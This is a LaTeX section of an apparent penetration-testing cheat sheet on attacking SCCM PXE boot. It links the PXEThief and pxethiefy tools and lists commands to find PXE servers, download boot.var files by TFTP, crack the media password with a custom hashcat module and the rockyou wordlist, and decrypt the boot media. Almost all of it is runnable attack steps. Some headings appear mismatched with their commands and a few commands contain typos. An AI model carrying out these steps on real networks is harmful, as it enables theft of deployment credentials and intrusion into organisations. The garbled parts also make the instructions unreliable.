\section{PXE exploit}
\begin{itemize}
    \item \href{https://github.com/MWR-CyberSec/PXEThief}{PXEThief}: (in Python, only available on Windows because of the pywin32 library dependency, and works better with Python 3.10) only works if we are attempting from a computer that is not registered on the SCCM server (categorized as Unknown) or if a particular configuration is set on the SCCM server to allow known clients from requesting the PXE boot. 
    \item \href{https://github.com/csandker/pxethiefy}{pxethiefy.py} is a tool to enumerate PXE boot media provided from an SCCM server in a target network by broadcasting for PXE servers, requesting offered boot media and trying to decrypt it.
\end{itemize}

\subsection{Non password protected}
\subsubsection{pxethiefy}
\begin{verbatim}
sudo python3 pxethiefy.py explore -i <interface>
sudo python3 pxethiefy.py explore -i <interface> -a <pxe_ip>
\end{verbatim}

\subsubsection{PXEThief}
\begin{verbatim}
pxethief.py 1
# or
pxethief.py 2 <target_fqdn>
\end{verbatim}

First, the crackable hash must be computed from the media. To achieve this, the boot.var file must be extracted  from the server using tftp:
\begin{verbatim}
tftp -i 172.50.0.30 GET "<boot_var_path>" "<boot_var_outfile>"
\end{verbatim}

then extract the hash
\begin{verbatim}
python .\pxethief.py 5 '.\boot_var_outfile'
\end{verbatim}


then it can be cracked using \href{https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module}{a specific hashcat module}

\begin{verbatim}
cd hashcat_pxe/
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat
git checkout -b v6.2.5 tags/v6.2.5 # change to 6.2.5
make

hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt
\end{verbatim}


Finally, the boot media can be requested with PXEThief and decrypted with the password. 

\begin{verbatim}
python .\pxethief.py 3 '.\boot_var_outfile' "<password>"
\end{verbatim}


\subsection{Password protected}
If PXE is protected by a password the files will be encrypted, \href{https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module}{this hashcat module} can be used to decrypt the downloaded media file.

\subsubsection{pxethiefy}
\begin{verbatim}
pxethief.py 1 or pxethief.py 2 <target_fqdn>

tftp -i 192.168.1.9 GET "\SMSTemp\2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var"
"2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var"

tftp -i 192.168.1.9 GET "\SMSTemp\2023.07.14.21.38.35.04.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.bcd"
"2023.07.14.21.38.35.04.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.bcd"

pxethief.py 5 2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var

./hashcat -m 19850 ./hash ./list.txt --force

python3 pxethief.py 3 "2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var" Password123
\end{verbatim}



\subsubsection{PXEThief}
\begin{verbatim}
/hashcat -m 19850 ./hash ./list.txt --force
sudo python3 pxethiefy.py decrypt -p <passwor> -f <boot_var_file>
\end{verbatim}

